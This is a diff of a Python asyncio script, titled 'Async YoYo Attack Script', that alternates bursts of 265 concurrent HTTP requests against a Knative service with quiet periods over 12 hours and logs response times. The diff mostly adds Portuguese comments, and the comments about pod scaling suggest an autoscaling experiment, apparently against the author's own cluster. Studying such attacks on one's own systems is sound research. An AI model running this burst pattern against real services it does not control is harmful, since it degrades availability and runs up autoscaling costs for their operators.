@@ -10,11 +10,11 @@ ATTACK_CONCURRENCY = 265            # Pod da scale aos 51, mas aumentar este val
 ON_ATTACK_DURATION = 35             # 160 segundos foi o valor maximo ate um Pod começar a terminar antes do ataque terminar.
 OFF_ATTACK_DURATION = 900           # 15 minutos updated minutos de pausa 
 RUN_DURATION = 12 * 60 * 60         # Total run time in seconds (12 hours)
-CONNECTION_TIMEOUT = aiohttp.ClientTimeout(total=10)
+CONNECTION_TIMEOUT = aiohttp.ClientTimeout(total=10)           # Apenas para debug.
 LOG_FILE = "logs/attack_metrics.log"
 
 
-
+#Recupera mensagens , e escreve-as no log_file 
 async def logger(queue, log_file):
     loop = asyncio.get_running_loop()
     while True:
@@ -23,12 +23,15 @@ async def logger(queue, log_file):
             break
         await loop.run_in_executor(None, write_log, log_file, message)
 
+#Escreve de forma síncrona uma única mensagem de log, para conseguir ver as entradas de log visíveis direto.
 def write_log(log_file, message):
     log_file.write(message)
     log_file.flush()
 
+
+# Envia continuamente os pedidos HTTP GET para o URL do knative com o aiohttp até que stop_time seja atingido. 
+# guarda ainda timestamp, a duração da resposta e o HTTP code 
 async def worker(session, stop_time, queue):
-    """Async request worker with response time logging"""
     while time.time() < stop_time:
         start_time = time.perf_counter()
         timestamp = datetime.now().isoformat()
@@ -46,10 +49,11 @@ async def worker(session, stop_time, queue):
             message = f"{timestamp},FAIL,{error_msg}\n"
         await queue.put(message)
 
+# Começa o ataque em si  com os 'workers' concorrentes. 
+# Cria um ClientSession aiohttp com um TCPConnector configurado para permitir as ligações ilimitadas e forçar  que termine. 
 async def run_attack(concurrency, duration, queue):
-    """Run async load test"""
     stop_time = time.time() + duration
-    connector = aiohttp.TCPConnector(limit=0, force_close=True)  # Add force_close=True
+    connector = aiohttp.TCPConnector(limit=0, force_close=True)  
     async with aiohttp.ClientSession(
         connector=connector,
         timeout=CONNECTION_TIMEOUT,
@@ -65,6 +69,7 @@ async def run_attack(concurrency, duration, queue):
         while time.time() < stop_time:
             elapsed = int(time.time() - start_time)
             remaining = int(stop_time - time.time())
+            # apenas para eu visualizar se der erro in real time.
             print(f"\rActive: {len(tasks)} | Elapsed: {elapsed}s | Remaining: {remaining}s", end="")
             await asyncio.sleep(1)
         
@@ -74,8 +79,7 @@ async def run_attack(concurrency, duration, queue):
         await asyncio.gather(*tasks, return_exceptions=True)
 
 async def main():
-    """Attack controller"""
-    print("Async YoYo Attack Script (12 hour total runtime)")
+    print("Async YoYo Attack Script (12 hour total runtime)")
     print(f"Target: {TARGET_URL}")
     print(f"Attack Concurrency: {ATTACK_CONCURRENCY}")
     start_time = time.time()
@@ -90,9 +94,9 @@ async def main():
                 print("\n=== COOL DOWN ===")
                 await run_attack(NORMAL_CONCURRENCY, OFF_ATTACK_DURATION, queue)
         except KeyboardInterrupt:
-            print("\nAttack stopped by user")
+            print("\nAttack stopped")
         finally:
-            # After 12h (or interruption), shut down
+            # Passado as 12h para o ataque
             print("\nReached 12 hours. Stopping simulation.")
             await queue.put(None)
             await logger_task
